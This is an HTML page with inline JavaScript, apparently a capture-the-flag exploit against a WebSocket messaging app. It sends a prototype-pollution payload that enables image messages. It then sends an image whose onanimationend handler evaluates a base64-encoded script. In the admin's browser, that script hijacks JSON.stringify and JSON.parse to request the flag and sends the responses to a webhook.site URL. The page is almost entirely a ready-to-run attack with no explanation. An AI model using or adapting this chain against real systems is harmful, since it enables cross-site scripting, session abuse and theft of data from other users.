<!DOCTYPE html>
<html>

<script>
    let exp = btoa(`
        window.send=(msg)=>{fetch('https://webhook.site/25e6343e-08ee-40eb-a10e-f9cf11ae343f?q='+encodeURIComponent(msg))};
        send('start');
        window.backup=JSON.stringify;
        window.backup2=JSON.parse;
        JSON.stringify=function(json){
            JSON.stringify = backup;
            return backup({
                api: 'getflag'
            })
        };
        JSON.parse=function(str){
            send(str);
            return backup2(str)
        };
        document.querySelector('button[type=submit]').click();
    `)

    const SERVER_URL = 'ws://192.168.194.128:8081'

    const ws = new WebSocket(SERVER_URL)

    ws.onopen = () => {
        console.log('connected')
        const msg = {
            api: "ping",
            data: "hello world"
        }
        ws.send(JSON.stringify(msg))
    }

    ws.onmessage = (e) => {
        const msg = e.data
        console.log('receieve:' + msg)
        if (isJSON(msg)) {
            handleMsg(JSON.parse(msg))
        }
    }

    ws.onclose = () => {
        console.log("closed")
    }

    function handleMsg(msg) {
        switch (msg.api) {
            case "login":
                handleLogin()
                break
            case "warning":
                handleWarning(msg.warning)
                break
            default:
                console.log("unkonwn api", msg.api)
        }
    }

    function handleLogin() {
        ws.send(JSON.stringify({
            api: "login",
            username: "123"
        }))
    }

    function handleWarning(warning) {
        alert(warning)
    }

    function isJSON(s) {
        try {
            if (typeof JSON.parse(s) == 'object') {
                return true
            }
        } catch (e) {
            // console.log(e)
        }
        return false
    }

    function pollute() {
        console.log("pollute")
        const msg = {
            api: 'sendmsg',
            to: 'admin',
            msg: {
                type: 'tpl',
                data: {
                    tpl: 'test.tpl',
                    ctx: '{"username":"123", "constructor":{"prototype":{ "allowImage":true}}}'
                }
            }
        }
        console.log(JSON.stringify(msg))
        ws.send(JSON.stringify(msg))
    }

    function xss() {
        console.log("xss")
        const msg = {
            api: 'sendmsg',
            to: 'admin',
            msg: {
                type: 'image',
                data: {
                    src: 'src',
                    attrs: {
                        wow: 1,
                        is: 'is',
                        onanimationend: `eval(atob("${exp}"))`,
                        style: {
                            "animation-name": "App-logo-spin",
                            "animation-duration": "0.1s",
                            "transform": "rotate(45deg)",
                            "background": "red",
                            "width": "50px",
                            "height": "50px"
                        }
                    }
                }
            }
        }
        console.log(JSON.stringify(msg))
        ws.send(JSON.stringify(msg))
    }
</script>

<button onclick="pollute()">pollute</button>
<button onclick="xss()">xss</button>

</html>